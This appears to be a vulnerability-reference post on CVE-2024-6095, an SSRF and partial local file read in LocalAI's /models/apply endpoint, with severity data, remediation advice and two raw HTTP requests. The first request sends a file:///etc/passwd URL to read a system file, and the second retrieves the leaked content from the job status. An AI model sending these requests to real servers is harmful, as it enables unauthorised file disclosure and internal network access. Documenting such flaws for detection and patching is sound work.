---
layout: post
cve_id: CVE-2024-6095
title: LocalAI - Partial Local File Read
pcap: true
pcap_path: /pcaps/2024/CVE-2024-6095.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-6095.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,pdresearch,rootxharsh
severity: medium
impact: 'Attackers can exploit SSRF to access internal HTTP services and partially
  read local files through error messages, potentially exposing sensitive information.

  '
remediation: 'Update LocalAI to version 2.17 or later to address the SSRF and LFI
  vulnerabilities.

  '
reference:
- https://github.com/fkie-cad/nvd-json-data-feeds
- https://github.com/sev-hack/sev-hack
- https://nvd.nist.gov/vuln/detail/CVE-2024-6095
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N
  cvss-score: 5.8
  cve-id: CVE-2024-6095
  cwe-id: CWE-918
  epss-score: 0.88974
  epss-percentile: 0.99502
  cpe: cpe:2.3:a:mudler:localai:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 2
  vendor: mudler
  product: localai
  shodan-query: http.favicon.hash:-976853304
tags:
- cve
- cve2024
- localai
- mudler
- lfi
- vuln
---

## üîç Vulnerability Description
A vulnerability in the /models/apply endpoint of mudler/localai versions 2.15.0 allows for Server-Side Request Forgery (SSRF) and partial Local File Inclusion (LFI). The endpoint supports both http(s)-// and file-// schemes, where the latter can lead to LFI. However, the output is limited due to the length of the error message. This vulnerability can be exploited by an attacker with network access to the LocalAI instance, potentially allowing unauthorized access to internal HTTP(s) servers and partial reading of local files. The issue is fixed in version 2.17.


## üåê HTTP Request
```nohighlight
POST /models/apply HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
Connection: close
Content-Length: 28
Content-Type: application/json
Accept-Encoding: gzip

{"url":"file:///etc/passwd"}
```

```nohighlight
GET /models/jobs/kgaOYi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:52.0) Gecko/20100101 Firefox/52.0
Connection: close
Accept-Encoding: gzip
```

